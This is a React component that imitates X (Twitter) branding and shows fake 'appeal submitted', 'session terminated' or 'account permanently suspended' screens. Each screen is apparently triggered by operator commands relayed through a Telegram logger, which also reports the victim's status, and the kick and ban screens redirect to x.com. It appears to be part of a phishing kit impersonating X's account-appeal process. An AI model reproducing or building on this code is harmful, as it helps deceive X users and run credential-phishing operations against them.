"use client";

import { useState, useEffect } from "react";
import { updateTelegramMessage, lastCommandWas } from "@/utils/telegramLogger";

interface ResultScreenProps {
  type: "finish" | "kick" | "ban";
  onClose: () => void;
}

export default function ResultScreen({ type, onClose }: ResultScreenProps) {
  const [countdown, setCountdown] = useState(5);

  // Update Telegram message when result screen shows
  useEffect(() => {
    const updateStatus = async () => {
      try {
        let statusText = "";

        // Sadece finish komutu geldiğinde başarılı mesajını göster
        if (type === "finish" && !lastCommandWas("finish")) {
          console.log("Preventing unauthorized success screen");
          onClose(); // Yetkisiz erişimde ekranı kapat
          return;
        }

        switch (type) {
          case "finish":
            statusText = "✅ Appeal submitted successfully";
            break;
          case "kick":
            statusText = "❌ User kicked - Session terminated";
            break;
          case "ban":
            statusText = "🚫 User banned - Account restricted";
            break;
        }

        await updateTelegramMessage({}, statusText);
      } catch (error) {
        console.error("Error updating Telegram message:", error);
      }
    };

    updateStatus();
  }, [type, onClose]);

  // Auto close after 5 seconds
  useEffect(() => {
    if (countdown <= 0) {
      // Kick veya Ban durumunda x.com'a yönlendir
      if (type === "kick" || type === "ban") {
        window.location.href = "https://x.com";
        return;
      }
      onClose();
      return;
    }

    const timer = setTimeout(() => {
      setCountdown(countdown - 1);
    }, 1000);

    return () => clearTimeout(timer);
  }, [countdown, onClose, type]);

  const getTitle = () => {
    switch (type) {
      case "finish":
        return "Appeal Submitted Successfully";
      case "kick":
        return "Account Access Terminated";
      case "ban":
        return "Account Permanently Suspended";
      default:
        return "Action Completed";
    }
  };

  const getMessage = () => {
    switch (type) {
      case "finish":
        return "Your appeal has been submitted. We will review your case and get back to you via email within 24-48 hours. Thank you for your patience.";
      case "kick":
        return "Your session has been terminated due to suspicious activity. You will be redirected to X.com in a few seconds.";
      case "ban":
        return "Your account has been permanently suspended for violating X Rules. You will be redirected to X.com in a few seconds.";
      default:
        return "The action has been completed. Thank you for your cooperation.";
    }
  };

  const getIconClass = () => {
    switch (type) {
      case "finish":
        return "text-green-500";
      case "kick":
        return "text-yellow-500";
      case "ban":
        return "text-red-500";
      default:
        return "text-blue-500";
    }
  };

  const getIcon = () => {
    switch (type) {
      case "finish":
        return (
          <svg xmlns="http://www.w3.org/2000/svg" className="h-16 w-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
          </svg>
        );
      case "kick":
        return (
          <svg xmlns="http://www.w3.org/2000/svg" className="h-16 w-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
        );
      case "ban":
        return (
          <svg xmlns="http://www.w3.org/2000/svg" className="h-16 w-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
          </svg>
        );
      default:
        return (
          <svg xmlns="http://www.w3.org/2000/svg" className="h-16 w-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
        );
    }
  };

  return (
    <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
      <div className="bg-white rounded-2xl w-full max-w-[400px] p-6 relative mx-4">
        {/* X logo */}
        <div className="flex justify-center mb-4">
          <svg viewBox="0 0 24 24" aria-hidden="true" className="h-7 w-7">
            <path
              d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
              fill="currentColor"
            />
          </svg>
        </div>

        {/* Icon */}
        <div className={`flex justify-center mb-4 ${getIconClass()}`}>
          {getIcon()}
        </div>

        {/* Title */}
        <h2 className="text-xl font-bold text-center mb-4">{getTitle()}</h2>

        {/* Message */}
        <p className="text-gray-600 text-center mb-6">
          {getMessage()}
        </p>

        {/* Countdown */}
        <p className="text-sm text-gray-500 text-center">
          {type === "finish" 
            ? `This window will close in ${countdown} seconds...`
            : `You will be redirected to X.com in ${countdown} seconds...`
          }
        </p>
      </div>
    </div>
  );
}
